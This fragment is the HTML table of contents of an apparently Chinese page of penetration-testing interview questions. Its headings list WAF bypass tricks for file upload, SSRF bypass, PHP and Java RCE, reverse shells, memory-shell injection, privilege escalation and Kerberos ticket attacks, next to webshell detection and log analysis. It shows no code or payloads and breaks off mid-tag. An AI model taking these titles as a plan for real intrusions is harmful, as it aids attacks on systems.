href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-%E7%BB%95waf"><span class="toc-number">14.</span> <span class="toc-text">文件上传漏洞原理,绕waf</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#http%E4%B8%8A%E4%BC%A0%E6%95%B0%E6%8D%AE%E5%8C%85"><span class="toc-number">14.1.</span> <span class="toc-text">http上传数据包</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9C%A8%E6%95%B0%E6%8D%AE%E5%8C%85%E4%B8%AD%E5%8F%AF%E4%BB%A5%E4%BF%AE%E6%94%B9%E7%9A%84%E5%9C%B0%E6%96%B9"><span class="toc-number">14.2.</span> <span class="toc-text">文件上传在数据包中可以修改的地方</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#waf%E5%A6%82%E4%BD%95%E6%8B%A6%E6%88%AA%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6"><span class="toc-number">14.3.</span> <span class="toc-text">waf如何拦截恶意文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">14.4.</span> <span class="toc-text">绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%8F%98%E5%BC%82"><span class="toc-number">14.4.1.</span> <span class="toc-text">字符变异</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%95%E5%8F%B7%E5%8F%98%E6%8D%A2"><span class="toc-number">14.4.1.1.</span> <span class="toc-text">引号变换</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E5%8F%98%E6%8D%A2"><span class="toc-number">14.4.1.2.</span> <span class="toc-text">大小写变换</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E6%8D%A2%E8%A1%8C%E7%AC%A6"><span class="toc-number">14.4.1.3.</span> <span class="toc-text">添加换行符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%9A%E4%B8%AA%E5%88%86%E5%8F%B7"><span class="toc-number">14.4.1.4.</span> <span class="toc-text">多个分号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%9A%E4%B8%AA%E7%AD%89%E5%8F%B7"><span class="toc-number">14.4.1.5.</span> <span class="toc-text">多个等号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%98%E6%8D%A2Content-Disposition%E7%9A%84%E5%80%BC"><span class="toc-number">14.4.1.6.</span> <span class="toc-text">变换Content-Disposition的值</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%95%B8%E5%BD%A2%E7%9A%84boundary%E5%A4%B4%E9%83%A8"><span class="toc-number">14.4.1.7.</span> <span class="toc-text">畸形的boundary头部</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A1%BA%E5%BA%8F%E9%A2%A0%E5%80%92"><span class="toc-number">14.4.2.</span> <span class="toc-text">顺序颠倒</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%A4%E6%8D%A2name%E5%92%8Cfilename%E7%9A%84%E9%A1%BA%E5%BA%8F"><span class="toc-number">14.4.2.1.</span> <span class="toc-text">交换name和filename的顺序</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%A4%E6%8D%A2Content-Disposition%E5%92%8CContent-Type%E7%9A%84%E9%A1%BA%E5%BA%8F"><span class="toc-number">14.4.2.2.</span> <span class="toc-text">交换Content-Disposition和Content-Type的顺序</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%A4%E6%8D%A2%E4%B8%8D%E5%90%8Cboundary%E5%86%85%E5%AE%B9%E7%9A%84%E9%A1%BA%E5%BA%8F"><span class="toc-number">14.4.2.3.</span> <span class="toc-text">交换不同boundary内容的顺序</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#boundary%E5%86%85%E5%AE%B9%E9%87%8D%E5%A4%8D"><span class="toc-number">14.4.3.</span> <span class="toc-text">boundary内容重复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#filename%E9%87%8D%E5%A4%8D"><span class="toc-number">14.4.4.</span> <span class="toc-text">filename重复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E6%BA%A2%E5%87%BA"><span class="toc-number">14.4.5.</span> <span class="toc-text">数据溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#name%E4%B8%8Efilename%E4%B9%8B%E9%97%B4%E6%8F%92%E5%85%A5%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE"><span class="toc-number">14.4.5.1.</span> <span class="toc-text">name与filename之间插入垃圾数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#boundary%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%E5%8A%A0%E5%85%A5%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE"><span class="toc-number">14.4.5.2.</span> <span class="toc-text">boundary字符串中加入垃圾数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#boundray%E6%9C%AB%E5%B0%BE%E6%8F%92%E5%85%A5%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE"><span class="toc-number">14.4.5.3.</span> <span class="toc-text">boundray末尾插入垃圾数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#multipart-x2F-form-data%E4%B8%8Eboundary%E4%B9%8B%E9%97%B4%E6%8F%92%E5%85%A5%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE"><span class="toc-number">14.4.5.4.</span> <span class="toc-text">multipart&#x2F;form-data与boundary之间插入垃圾数据</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E6%88%AA%E6%96%AD"><span class="toc-number">14.4.6.</span> <span class="toc-text">数据截断</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9B%9E%E8%BD%A6%E6%8D%A2%E8%A1%8C%E6%88%AA%E6%96%AD"><span class="toc-number">14.4.6.1.</span> <span class="toc-text">回车换行截断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E5%8F%B7%E6%88%AA%E6%96%AD"><span class="toc-number">14.4.6.2.</span> <span class="toc-text">分号截断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%95%E5%8F%B7%E6%88%AA%E6%96%AD"><span class="toc-number">14.4.6.3.</span> <span class="toc-text">引号截断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#00%E6%88%AA%E6%96%AD"><span class="toc-number">14.4.6.4.</span> <span class="toc-text">00截断</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%9F"><span class="toc-number">15.</span> <span class="toc-text">为什么会存在文件上传漏洞？</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89"><span class="toc-number">15.1.</span> <span class="toc-text">定义</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%B1%E5%AE%B3"><span class="toc-number">15.2.</span> <span class="toc-text">危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%BB%A1%E8%B6%B3%E6%9D%A1%E4%BB%B6"><span class="toc-number">15.3.</span> <span class="toc-text">上传漏洞满足条件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E5%8F%AF%E4%BB%A5%E7%94%A8%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-number">16.</span> <span class="toc-text">什么时候可以用条件竞争</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E5%90%8E%E5%88%A0%E9%99%A4"><span class="toc-number">16.1.</span> <span class="toc-text">上传后删除</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8php-session-upload-progress%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">16.2.</span> <span class="toc-text">利用php _session_upload_progress进行文件包含</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%99%E8%BF%87%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E5%90%97"><span class="toc-number">17.</span> <span class="toc-text">写过目录扫描工具吗</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%8D%E9%80%9A%E8%BF%87%E7%8A%B6%E6%80%81%E7%A0%81%E5%88%A4%E6%96%AD%E7%9A%84%E6%96%B9%E5%BC%8F%E5%A6%82%E4%BD%95%E7%A1%AE%E5%AE%9A%E6%98%AF%E5%85%B7%E4%BD%93%E6%96%87%E4%BB%B6"><span class="toc-number">18.</span> <span class="toc-text">不通过状态码判断的方式如何确定是具体文件</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#404%E9%A1%B5%E9%9D%A2%E8%AF%86%E5%88%AB%E6%80%9D%E8%B7%AF"><span class="toc-number">18.1.</span> <span class="toc-text">404页面识别思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#404%E9%A1%B5%E9%9D%A2%E8%BF%87%E6%BB%A4"><span class="toc-number">18.2.</span> <span class="toc-text">404页面过滤</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#http-only%E7%9A%84%E4%BD%9C%E7%94%A8-%E6%9C%89http-only%E6%80%8E%E4%B9%88%E8%8E%B7%E5%8F%96cookie"><span class="toc-number">19.</span> <span class="toc-text">http only的作用 有http only怎么获取cookie</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS%E9%99%A4%E4%BA%86%E7%9B%97%E5%8F%96Cookie%E8%BF%98%E8%83%BD%E5%B9%B2%E5%98%9B%EF%BC%9F"><span class="toc-number">20.</span> <span class="toc-text">XSS除了盗取Cookie还能干嘛？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS%E9%98%B2%E5%BE%A1%EF%BC%9FCSP%E6%80%8E%E4%B9%88%E7%BB%95%EF%BC%9F"><span class="toc-number">21.</span> <span class="toc-text">XSS防御？CSP怎么绕？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#xss%E5%92%8Ccsrf%E5%8C%BA%E5%88%AB"><span class="toc-number">22.</span> <span class="toc-text">xss和csrf区别</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF%E6%9C%89%E5%93%AA%E4%BA%9B%E5%88%A9%E7%94%A8%E7%82%B9%EF%BC%9F"><span class="toc-number">23.</span> <span class="toc-text">SSRF有哪些利用点？</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ssrf%E5%AF%BB%E6%89%BE"><span class="toc-number">23.1.</span> <span class="toc-text">ssrf寻找</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF%E7%9A%84IP%E7%BB%95%E8%BF%87%EF%BC%9F"><span class="toc-number">24.</span> <span class="toc-text">SSRF的IP绕过？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E6%9C%89%E4%BA%86%E8%A7%A3%E5%90%97%EF%BC%9F%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%9F"><span class="toc-number">25.</span> <span class="toc-text">PHP命令执行函数有了解吗？有哪些？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php-rce%E5%87%BD%E6%95%B0"><span class="toc-number">26.</span> <span class="toc-text">php rce函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#eval%E4%B8%8Esystem%E5%8C%BA%E5%88%AB"><span class="toc-number">27.</span> <span class="toc-text">eval与system区别</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Log4J%E6%BC%8F%E6%B4%9E%E6%9C%89%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3%E5%90%97%EF%BC%9F"><span class="toc-number">28.</span> <span class="toc-text">Log4J漏洞有深入了解吗？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93%E6%88%96%E8%80%85%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E7%94%A8%E8%BF%87%E5%90%97%EF%BC%9F"><span class="toc-number">29.</span> <span class="toc-text">参数污染或者模糊测试用过吗？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E8%BF%87app-%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%90%97"><span class="toc-number">30.</span> <span class="toc-text">渗透过app,小程序吗</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#cc%E9%93%BE%E4%B8%AD%E7%9A%844%E7%A7%8Dtransformer"><span class="toc-number">31.</span> <span class="toc-text">cc链中的4种transformer</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%BC%A9%E5%B0%8F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E6%89%A7%E8%A1%8C%E9%93%BE"><span class="toc-number">32.</span> <span class="toc-text">如何缩小反序列化的执行链</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AD%98%E5%9C%A8rce%E7%9A%84%E6%B4%9E-%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8runtime-exec%E5%81%9A%E5%8F%8D%E5%BC%B9shell%E5%90%97"><span class="toc-number">33.</span> <span class="toc-text">存在rce的洞,可以利用runtime.exec做反弹shell吗</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#java%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE-%E5%A6%82%E4%BD%95%E5%A4%84%E7%90%86-%E5%A6%82%E4%BD%95%E5%BE%97%E5%88%B0%E5%9B%9E%E6%98%BE"><span class="toc-number">34.</span> <span class="toc-text">java执行无回显,如何处理,如何得到回显</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#shiro%E4%B8%AD%E5%A6%82%E4%BD%95%E6%A3%80%E6%B5%8Bkey%E7%9A%84%E6%AD%A3%E7%A1%AE%E6%80%A7"><span class="toc-number">35.</span> <span class="toc-text">shiro中如何检测key的正确性</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#shiro%E6%B3%A8%E5%86%85%E5%AD%98%E9%A9%AC-%E7%BB%B4%E6%8C%81%E6%9D%83%E9%99%90"><span class="toc-number">36.</span> <span class="toc-text">shiro注内存马(维持权限)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#java%E7%9A%84shiro%E6%A1%86%E6%9E%B6-%E8%BF%9B%E9%98%B6%E5%88%A9%E7%94%A8-%E6%98%AF%E5%90%A6%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5"><span class="toc-number">37.</span> <span class="toc-text">java的shiro框架,进阶利用,是否内存马注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Spring%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E"><span class="toc-number">38.</span> <span class="toc-text">Spring相关漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80"><span class="toc-number">39.</span> <span class="toc-text">内存马查杀</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%88%86%E7%B1%BB"><span class="toc-number">39.1.</span> <span class="toc-text">内存马的分类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E6%9D%80%E6%80%9D%E8%B7%AF"><span class="toc-number">39.2.</span> <span class="toc-text">查杀思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E8%AF%86%E5%88%AB"><span class="toc-number">39.3.</span> <span class="toc-text">内存马的识别</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#filter%E5%90%8D%E5%AD%97%E5%BE%88%E7%89%B9%E5%88%AB"><span class="toc-number">39.3.1.</span> <span class="toc-text">filter名字很特别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#filter%E4%BC%98%E5%85%88%E7%BA%A7%E6%98%AF%E7%AC%AC%E4%B8%80%E4%BD%8D"><span class="toc-number">39.3.2.</span> <span class="toc-text">filter优先级是第一位</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E6%AF%94web-xml%E4%B8%AD%E6%B2%A1%E6%9C%89filter%E9%85%8D%E7%BD%AE"><span class="toc-number">39.3.3.</span> <span class="toc-text">对比web.xml中没有filter配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%AE%8Aclass-loader%E5%8A%A0%E8%BD%BD"><span class="toc-number">39.3.4.</span> <span class="toc-text">特殊class loader加载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E5%BA%94%E7%9A%84classloader%E8%B7%AF%E5%BE%84%E4%B8%8B%E9%9D%A2%E6%B2%A1%E6%9C%89class%E6%96%87%E4%BB%B6"><span class="toc-number">39.3.5.</span> <span class="toc-text">对应的classloader路径下面没有class文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dilter%E7%9A%84dofilter%E6%96%B9%E6%B3%95%E4%B8%AD%E6%9C%89%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81"><span class="toc-number">39.3.6.</span> <span class="toc-text">dilter的dofilter方法中有恶意代码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E6%9F%A5%E6%9D%80"><span class="toc-number">39.4.</span> <span class="toc-text">内存马的查杀</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B8%85%E9%99%A4%E5%86%85%E5%AD%98%E9%A9%AC%E4%B8%AD%E7%9A%84filter%E7%9A%84%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81"><span class="toc-number">39.4.1.</span> <span class="toc-text">清除内存马中的filter的恶意代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%8B%9F%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%B3%A8%E9%94%80filter"><span class="toc-number">39.4.2.</span> <span class="toc-text">模拟中间件注销filter</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%98%BF%E9%87%8C%E5%BC%80%E6%BA%90%E7%9A%84Java%E8%AF%8A%E6%96%AD%E5%B7%A5%E5%85%B7%E2%80%94%E2%80%94Arthas"><span class="toc-number">40.</span> <span class="toc-text">阿里开源的Java诊断工具——Arthas</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#fastjson%E9%81%87%E5%88%B0%E5%90%97"><span class="toc-number">41.</span> <span class="toc-text">fastjson遇到吗</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B"><span class="toc-number">42.</span> <span class="toc-text">内网渗透流程</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">43.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#linux%E6%9C%80%E6%96%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E"><span class="toc-number">44.</span> <span class="toc-text">linux最新提权漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux%E6%8F%90%E6%9D%83%E7%9A%84%E6%96%B9%E6%B3%95%EF%BC%9FCVE-2021-4034-pkexec%E6%9C%89%E4%BA%86%E8%A7%A3%E5%90%97%EF%BC%9F"><span class="toc-number">45.</span> <span class="toc-text">Linux提权的方法？CVE-2021-4034 pkexec有了解吗？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">46.</span> <span class="toc-text">权限维持</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%93%9D%E9%98%9F%E5%8F%8D%E6%9D%80%E7%BA%A2%E9%98%9F%E7%9A%84%E7%BB%8F%E5%8E%86%E6%9C%89%E5%90%97"><span class="toc-number">47.</span> <span class="toc-text">蓝队反杀红队的经历有吗</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%92%88%E5%AF%B9ip%E6%BA%AF%E6%BA%90%E4%B8%80%E4%BA%8C"><span class="toc-number">47.1.</span> <span class="toc-text">针对ip溯源一二</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%A5%E8%87%AA%E5%88%9B%E5%AE%87%E7%9B%BE%E7%AD%89%E8%8A%82%E7%82%B9%E7%9A%84%E6%B5%81%E9%87%8Fip"><span class="toc-number">47.1.1.</span> <span class="toc-text">来自创宇盾等节点的流量ip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#whois-%E5%9F%9F%E5%90%8D%E5%8F%8D%E6%9F%A5"><span class="toc-number">47.1.2.</span> <span class="toc-text">whois 域名反查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E7%AB%AF%E5%8F%A3-%E6%9C%8D%E5%8A%A1-%E8%BF%9B%E8%A1%8C%E5%8F%8D%E6%B8%97%E9%80%8F"><span class="toc-number">47.1.3.</span> <span class="toc-text">探测端口 服务 进行反渗透</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5"><span class="toc-number">47.1.4.</span> <span class="toc-text">威胁情报</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%82%AE%E7%AE%B1-qq-%E6%89%8B%E6%9C%BA%E5%8F%B7-%E7%A4%BE%E5%B7%A5%E5%BA%93"><span class="toc-number">47.1.5.</span> <span class="toc-text">邮箱 qq 手机号 社工库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#qq-%E5%BE%AE%E4%BF%A1-%E6%8A%96%E9%9F%B3-%E9%99%8C%E9%99%8C-%E7%AD%89%E6%8E%A5%E5%8F%A3"><span class="toc-number">47.1.6.</span> <span class="toc-text">qq 微信 抖音 陌陌 等接口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ga%E6%95%B0%E6%8D%AE-%E8%BF%90%E8%90%A5%E5%95%86%E6%95%B0%E6%8D%AE"><span class="toc-number">47.1.7.</span> <span class="toc-text">ga数据 运营商数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%BA%A2%E9%98%9F%E8%A2%AB%E5%8F%8D%E6%9D%80%E7%9A%84%E5%A7%BF%E5%8A%BF"><span class="toc-number">47.2.</span> <span class="toc-text">常见红队被反杀的姿势</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%88%B6%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E7%9A%84%E6%93%8D%E4%BD%9C"><span class="toc-number">47.3.</span> <span class="toc-text">反制红队基础设施的操作</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cobalt-strike%E5%8F%8D%E5%88%B6"><span class="toc-number">47.3.1.</span> <span class="toc-text">cobalt strike反制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%92%88%E5%AF%B9dnslog%E7%9A%84%E5%8F%8D%E5%88%B6"><span class="toc-number">47.3.2.</span> <span class="toc-text">针对dnslog的反制</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E4%B8%8E%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%A9%E7%94%A8%E5%92%8C%E5%8E%9F%E7%90%86"><span class="toc-number">48.</span> <span class="toc-text">约束与非约束委派攻击的利用和原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-x2F-%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E7%9F%A5%E9%81%93%E5%90%97%EF%BC%9F%E5%8C%BA%E5%88%AB%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">49.</span> <span class="toc-text">黄金票据&#x2F;白银票据知道吗？区别是什么？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E4%B8%8D%E6%98%AFwebshell"><span class="toc-number">50.</span> <span class="toc-text">判断是不是webshell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#linux%E6%97%A5%E5%BF%97"><span class="toc-number">51.</span> <span class="toc-text">linux日志</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#linux%E5%91%BD%E4%BB%A4"><span class="toc-number">52.</span> <span class="toc-text">linux命令</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%A3%80%E6%B5%8BWebshell%E7%9A%84%E6%80%9D%E8%B7%AF%EF%BC%9F"><span class="toc-number">53.</span> <span class="toc-text">手工检测Webshell的思路？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#webshell%E6%B5%81%E9%87%8F%E4%BF%A1%E6%81%AF"><span class="toc-number">54.</span> <span class="toc-text">webshell流量信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CS%E8%B7%9FMSF%E6%89%93%E8%BF%87%E5%86%85%E7%BD%91%E5%90%97%EF%BC%9F"><span class="toc-number">55.</span> <span class="toc-text">CS跟MSF打过内网吗？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">56.</span> <span class="toc-text">进程注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5%E8%B7%9F%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5%E7%9A%84%E5%8C%BA%E5%88%AB%EF%BC%9F"><span class="toc-number">57.</span> <span class="toc-text">正向连接跟反向连接的区别？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%89%E6%B2%A1%E6%9C%89%E6%8A%93%E8%BF%87%E5%AF%86%E7%A0%81%EF%BC%9F2012%E5%89%8D%E5%90%8E%E7%89%88%E6%9C%AC%E6%9C%89%E5%95%A5%E5%8C%BA%E5%88%AB%EF%BC%9F"><span class="toc-number">58.</span> <span class="toc-text">有没有抓过密码？2012前后版本有啥区别？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8B%BF%E5%88%B0%E6%97%A5%E5%BF%97%E5%A6%82%E4%BD%95%E5%88%86%E6%9E%90%EF%BC%9F"><span class="toc-number">59.</span> <span class="toc-text">拿到日志如何分析？</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E5%BE%81%E5%AD%97%E7%AC%A6%E5%88%86%E6%9E%90"><span class="toc-number">59.1.</span> <span class="toc-text">特征字符分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E9%A2%91%E7%8E%87%E5%88%86%E6%9E%90"><span class="toc-number">59.2.</span> <span class="toc-text">访问频率分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E6%A3%80%E6%9F%A5"><span class="toc-number">59.2.1.</span> <span class="toc-text">漏洞扫描检查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%A3%80%E6%B5%8B"><span class="toc-number">59.2.2.</span> <span class="toc-text">暴力破解检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#webshell%E6%A3%80%E6%B5%8B"><span class="toc-number">59.2.3.</span> <span class="toc-text">webshell检测</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#java%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E7%9A%84rce%E6%9C%89%E8%BF%87%E4%BA%86%E8%A7%A3%E5%90%97%EF%BC%9F%E7%B1%BB%E4%BC%BCphp%E7%9A%84eval"><span class="toc-number">60.</span> <span 